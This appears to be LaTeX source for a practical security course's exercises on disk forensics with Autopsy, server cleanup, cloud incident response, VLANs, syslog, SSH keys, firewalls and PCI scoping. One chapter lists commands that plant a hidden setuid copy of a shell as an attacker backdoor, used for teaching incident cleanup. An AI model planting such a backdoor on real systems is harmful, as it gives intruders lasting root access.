\begin{alltt}
user@KaliVM:~$
user@KaliVM:~$ mkdir forensic
user@KaliVM:~$ cd forensic/
user@KaliVM:~/forensic$ unzip ../Downloads/4-kwsrch-ext3.zip
Archive:  ../Downloads/4-kwsrch-ext3.zip
  inflating: 4-kwsrch-ext3/COPYING-GNU.txt
  inflating: 4-kwsrch-ext3/README.txt
  inflating: 4-kwsrch-ext3/ext3-img-kw-1.dd
  inflating: 4-kwsrch-ext3/index.html
user@KaliVM:~/forensic$ pwd
/home/user/forensic
user@KaliVM:~/forensic$
\end{alltt}

Note: I run as user hlk, so note down the full path for the imagefile, in my case \verb+/home/user/forensic/4-kwsrch-ext3/ext3-img-kw-1.dd+


\begin{alltt}
root@KaliVM:~# autopsy

============================================================================

                       Autopsy Forensic Browser
                  http://www.sleuthkit.org/autopsy/
                             ver 2.24

============================================================================
Evidence Locker: /var/lib/autopsy
Start Time: Wed Jun  5 16:16:12 2019
Remote Host: localhost
Local Port: 9999

Open an HTML browser on the remote host and paste this URL in it:

    http://localhost:9999/autopsy

Keep this process running and use <ctrl-c> to exit
\end{alltt}


{\bf Hints:}\\
Generating a time line of timestamps with date created, modification etc. can sometimes highlight the interesting times. A hacker breaking in and replacing a file would often end up having modified time stamps.

If you want to automate or use the command line for other reasons there are some documentation available, example \url{http://wiki.sleuthkit.org/index.php?title=FS_Analysis}

{\bf Solution:}\\
When you team has opened at least one file system from an image file, you are done.

Hopefully you should be able reach something like this:
\hlkimage{16cm}{sleuthkit-2019.png}

{\bf Discussion:}\\



\chapter{Clean or rebuild a server 20min}
\label{ex:clean-or-rebuild}

{\bf Objective:}\\
Think about a hacked system, how can you clean such a system?

{\bf Purpose:}\\
Realize that you can never be completely sure the system really is secure.

{\bf Suggested method:}\\
Consider the system from exercise \ref{ex:priv-esc-cron}

We created a back door in this system:
(We created it in /tmp so it may have been deleted, but lets say it was created in /sbin instead)

Commands executed:

\begin{alltt}
root@debian:~# rm /tmp/.xxsh
root@debian:~# cp /bin/dash /tmp/.xxsh
root@debian:~# chmod +sw /tmp/.xxsh
\end{alltt}

Is this the only file left by the attacker?

Did he change other files, configurations, added users, changed user passwords?

{\bf Hints:}\\
A forensics investigation might perform a complete dump of the file systems and use TASK/Autopsy. Then by generating a timeline it might be possible to find the back door files. Perhaps.

{\bf Solution:}\\
Rebuild your Debian server.
Automate the setup of critical systems.
Have good backup of critical data.

{\bf Discussion:}\\
Cleaning systems and whole environments is very hard.

An attacker may have spent only 30 minutes, but the investigation might take 100 hours. This is a huge difference in resources spent.

No such thing as \emph{Was just browsing the system}

\chapter{Cloud environments influence on incident response 20min}
\label{ex:cloud-incident-response}

{\bf Objective:}\\
Talk about the difference in computer forensics in cloud environments.

Cloud environments, or mixed environments between cloud and traditional environments present new challenges.

{\bf Purpose:}\\
Discuss what sources of information is available.

Traditional computer forensics often use these sources:
\begin{itemize}
\item Network forensics
\item Applications logs
\item Operating system logs
\item Disk imaging
\end{itemize}

Cloud environments can often use these sources:

\begin{itemize}
\item Logging from authentication
\item Limited network forensics
\item Applications logs
\end{itemize}

This relies more on the capabilities of the cloud vendor and often cloud environments are also much more dynamic. Some services are also provided by the cloud vendor, separating the management away from the customer configured environment - with good or bad consequences for computer forensics.

{\bf Suggested method:}\\
Discuss in your group, how would you investigate an incident in your solutions.

Has any in our group performed incident handling in cloud environments.

{\bf Hints:}\\
NIST has a few papers about this subject.

Example:
\emph{Identifying Evidence for Implementing a Cloud Forensic Analysis Framework}
\link{https://www.nist.gov/publications/identifying-evidence-implementing-cloud-forensic-analysis-framework}

{\bf Solution:}\\
Download the linked paper and browse it. It contains an example cloud and the conclusion scratches the surface of what a cloud maybe should provide.

{\bf Discussion:}\\
Cloud computer forensics seem immature, but must be researched.

If you organization relies on cloud computing it is critcal to update incident handling procedures for these new challenges.



\end{document}

\chapter{Switch configuration and uplink}
\label{ex:switch-config-vlan}

We will now perform multiple exercises as part of the System Security in Practice.

{\bf Overall Objective:}\\
Try some of the security mechanisms used in real networks today.

First is to configure VLAN. This feature is well-known in network.

You can read more about the technology at\\ \url{https://en.wikipedia.org/wiki/IEEE_802.1Q}

{\bf Overall Purpose:}\\
Learn that a few changes make a huge difference.

{\bf Suggested method:}\\
Work on our model network, each team has a server and an attacker - reduce attack surface on the server by configuration.

\begin{itemize}
\item Configure VLAN on switch for the uplink
\item Enable central logging
\item Configure SSH keys for more secure access
\item Enable firewall
\end{itemize}

\section*{Switch configuration and uplink}

Each team has a switch they \emph{own}
\begin{list2}
\item Add VLAN 2770 to switch
\item Configure uplink port to be a tagged VLAN trunk - port 8
\item Configure port to connect to local Debian server, port 1.\\ Note: if tagged Debian must be configured with tag too! You can instead configure as Access port without tag. You decide.
\item Insert USB Ethernet into Debian server virtual machine
\end{list2}

\eject
\section*{Switch config initial steps to get started}

{\bf Only connect switch ports when told to do so!}

\begin{enumerate}
\item First -- install the VLAN support on your Debian server!\\
\verb+apt-get install vlan+
\vskip 2cm
\item Power the switch - wait for the switch to boot, a few minutes should be OK
\item Reset the switch to default setting - press reset for 15 seconds before doing any configuration
\item Cable a laptop to any port, except the first one - port 1/0/1 or last one port 1/0/8
\item Take control of the switch, default settings are in place, see label on bottom and use Ethernet
\item Add VLAN with ID: 2770 Name: KramsIX

\item Configure the Uplink port 1/0/8 with VLAN tag: 2770
\item Configure the first port 1/0/1 with VLAN tag: 2770\\
If you keep the port in VLAN 1 you should be able to connect to the switch management via this port using tagged or untagged, as you prefer \smiley
\item Configure VLAN interface on your server with the IP in the LAN 10.10.10.45.0/24 - if your team ID is 14, then your IP is 10.10.10.14/24
\item Add 10.10.10.1 as your default gateway
\item Use 10.10.10.1 as DNS resolver

\vskip 2cm
\item Connect uplink to common switch, KramsIX. Use port 8
Connect port 1 to your laptop. Use USB Ethernet if your laptop does not have Ethernet port. Configure your virtualisation to have this device connected to your Debian server
\item Ping 10.10.10.1 from your server
\end{enumerate}

Switch administration - see under switch for IP and username.

\hlkimage{10cm}{vlan-tag-kramsix.png}


Your network config should look something like this:
\begin{alltt}
$ cat /etc/network/interfaces
# interfaces(5) file used by ifup(8) and ifdown(8)
# Include files from /etc/network/interfaces.d:
source-directory /etc/network/interfaces.d

auto enx00249b1b2991
iface enx00249b1b2991 inet static
  address 192.168.0.2
  netmask 255.255.255.0

auto vlan2770
iface vlan2770 inet static
	vlan-raw-device enx00249b1b2991
	address 10.10.10.14
	netmask 255.255.255.0
  gateway 10.10.10.1
\end{alltt}

The IP configuration without VLAN tag shown will allow you to reach the switch from the Debian server.

{\bf Hints:}\\
If you dont want to do this exercise then don't. Just connect your Debian server to the normal network using a bridge or even NAT.

{\bf Solution:}\\
When your Debian server can reach the course network 10.0.45.0/24 you are done.

{\bf Discussion:}\\
VLAN separation using the IEEE 802.1q standard is a common method to isolate servers from each other. Commonly used in DMZ networks in server parts, and in Voice over IP networks in LAN setup with clients.


\chapter{Centralized Logging}
\label{ex:central-logging}


{\bf Objective:} \\
See how server syslog is configured on regular Unix/Linux, and send logs to centralized server.

{\bf Purpose:}\\
The main idea of this exercise is to understand how easy network connected systems can send log data.


{\bf Suggested method:}\\
Log into your local Linux systems or network devices, see how syslog is configured.

{\bf Hints:}\\
Look in the config file, may be in /etc/syslog  or /etc/syslog-ng/syslog-ng.conf

Sample output from old-skool syslogd
\begin{alltt}
\small
*.err;kern.debug;auth.notice;authpriv.none;mail.crit    /dev/console
*.notice;auth,authpriv,cron,ftp,kern,lpr,mail,user.none /var/log/messages
kern.debug;user.info;syslog.info                        /var/log/messages
auth.info                                               /var/log/authlog
authpriv.debug                                          /var/log/secure
...
# Uncomment to log to a central host named "loghost".
#*.notice;auth,authpriv,cron,ftp,kern,lpr,mail,user.none        @loghost
#kern.debug,user.info,syslog.info                               @loghost
#auth.info,authpriv.debug,daemon.info                           @loghost
\end{alltt}

Advanced users will configure the logging also.

Either add the host given by the instructor \verb+10.0.45.200+ in the \verb+/etc/hosts+ with the name loghost or give it a name and then use that name in the config file.


{\bf Solution:}\\
When you understand how to configure syslog to send towards a central host you are done.

Feel free to re-visit the exercise \nameref{ex:kibana-dashboard}

{\bf Discussion:}\\
There are syslog senders for Windows too.


\chapter{Configure SSH keys for more secure access}
\label{ex:config-ssh-keys}

{\bf Objective:}\\
See how SSH keys can be used.

{\bf Purpose:}\\
Secure Shell is a very powerful administration tool. Administrators use this for managing systems. If an attacker gains access they can perform the same tasks.

Using SSH keys for access and disabling password based logins effectively prevents brute-force login attacks from succeeding.

{\bf Suggested method:}\\
First generate a SSH key, use:

\begin{alltt}
\$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Created directory '/root/.ssh'.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/hlk/.ssh/id_rsa.
Your public key has been saved in /home/hlk/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:l5esp66lQArFOlXqOoHnxpg8zRS6shK8nx9KGf+oSp4 root@debian01
The key's randomart image is:
+---[RSA 2048]----+
|      .          |
|   . o           |
|   .=            |
| ..=.      o .   |
|o.*o. . S o +    |
|oB==+o   . o     |
|+*B=.o.   o .    |
|=++.o +. o o     |
|oEo=oo .ooo      |
+----[SHA256]-----+
\end{alltt}

Then use the utility tool \verb+ssh-copy-id+ for copying the public key to the server. Install tool if not available using \verb+apt+ :
\begin{alltt}
hlk@kunoichi:hlk$ ssh-copy-id -i /home/hlk/.ssh/id_rsa hlk@10.0.42.147
/usr/local/bin/ssh-copy-id: INFO: Source of key(s) to be installed: ".ssh/kramse.pub"
The authenticity of host '10.0.42.147 (10.0.42.147)' can't be established.
ECDSA key fingerprint is SHA256:DP6jqadDWEJW/3FYPY84cpTKmEW7XoQ4zDNf/RdTu6M.
Are you sure you want to continue connecting (yes/no)? yes
/usr/local/bin/ssh-copy-id: INFO: attempting to log in with the new key(s),
to filter out any that are already installed
/usr/local/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you
are prompted now it is to install the new keys
hlk@10.0.42.147's password:

Number of key(s) added:        1

Now try logging into the machine, with:   "ssh -o 'IdentitiesOnly yes' 'hlk@10.0.42.147'"
and check to make sure that only the key(s) you wanted were added.
\end{alltt}

\vskip 5mm

\centerline{This is the best tool for the job!}

The public must exist in the \verb+authorized_keys+ file, in the right directory, with the correct permissions ... use \verb+ssh-copy-id+

{\bf Hints:}\\
You can publish the public part of your SSH keys in places such as Github and Ubuntu installation can fetch this during install, making the use of SSH keys extremely easy.

{\bf Solution:}\\
When you can login using key you are done.

{\bf Discussion:}\\
We have not discussed using passphrase on the key, neither how to turn off password based logins by reconfiguring the SSH daemon. This is left as an exercise for the reader.

\chapter{Enable firewall}
\label{ex:debian-firewall}

{\bf Objective:}\\
Turn on a firewall and configure a few simple rules.

{\bf Purpose:}\\
See how easy it is to restrict incoming connections to a server.


{\bf Suggested method:}\\
Install a utility for firewall configuration.

You should also perform Nmap port scan with the firewall enabled and disabled.

{\bf Hints:}\\
Using the ufw package it is very easy to configure the firewall on Linux.

Install and configuration can be done using these commands.
\begin{alltt}
root@debian01:~# apt install ufw
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following NEW packages will be installed:
  ufw
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 164 kB of archives.
After this operation, 848 kB of additional disk space will be used.
Get:1 http://mirrors.dotsrc.org/debian stretch/main amd64 ufw all 0.35-4 [164 kB]
Fetched 164 kB in 2s (60.2 kB/s)
...
root@debian01:~# ufw allow 22/tcp
Rules updated
Rules updated (v6)
root@debian01:~# ufw enable
Command may disrupt existing ssh connections. Proceed with operation (y|n)? y
Firewall is active and enabled on system startup
root@debian01:~# ufw status numbered
Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 22/tcp (v6)                ALLOW IN    Anywhere (v6)
\end{alltt}

Also allow port 80/tcp and port 443/tcp - and install a web server. Recommend Nginx \verb+apt-get install nginx+

{\bf Solution:}\\
When firewall is enabled and you can still connect to Secure Shell (SSH) and web service, you are done.

{\bf Discussion:}\\
Further configuration would often require adding source prefixes which are allowed to connect to specific services. If this was a database server the database service should probably not be reachable from all of the Internet.

Web interfaces also exist, but are more suited for a centralized firewall.

Configuration of this firewall can be done using ansible, see the documentation and examples at \url{https://docs.ansible.com/ansible/latest/modules/ufw_module.html}

Should you have both a centralized firewall in front of servers, and local firewall on each server? Discuss within your team.

\chapter{Evaluate Scope Towards PCI}
\label{ex:PCI-evaluation}

{\bf Objective:}\\
Evaluate our network, quick gap analysis for becoming PCI compliant

{\bf Purpose:}\\
Consider the term scope and influence on securing an environment.

{\bf Suggested method:}\\
Consider a small network like the one used for exercises. Consider the requirements for running exercises, why did we isolate this part from the rest of the network.

What are the parts used:
\begin{itemize}
\item Router(s), switches, network equipment
\item Firewall(s)
\item Design DMZ, LAN, WLAN
\item "Servers" - your laptops with Debian
\end{itemize}

Write down the current status, What are the network parts, organization and applications (Nginx running on single Debian server?).

Consider the impact of adding wireless network to this setup. Is this a requirement, could we do without it.

Consider if firewalls would be best practice or an actual requirement, how to implement this requirement for your organization.

{\bf Hints:}\\
Running a host firewall seldom hurts performance today. So turn on the firewall as described in exercise \nameref{ex:debian-firewall}

{\bf Solution:}\\
When you have browsed the PCI web site and documents, and documented the scope in 3-5 sentences or a small table. You are done.

{\bf Discussion:}\\

What is more important:

\begin{itemize}
\item Personal data, non-biometric
\item Financial data, like credit card data
\item Biometric data iris, DNA etc.
\item Password data
\end{itemize}

What if they are leaked, how to recover?

\end{document}
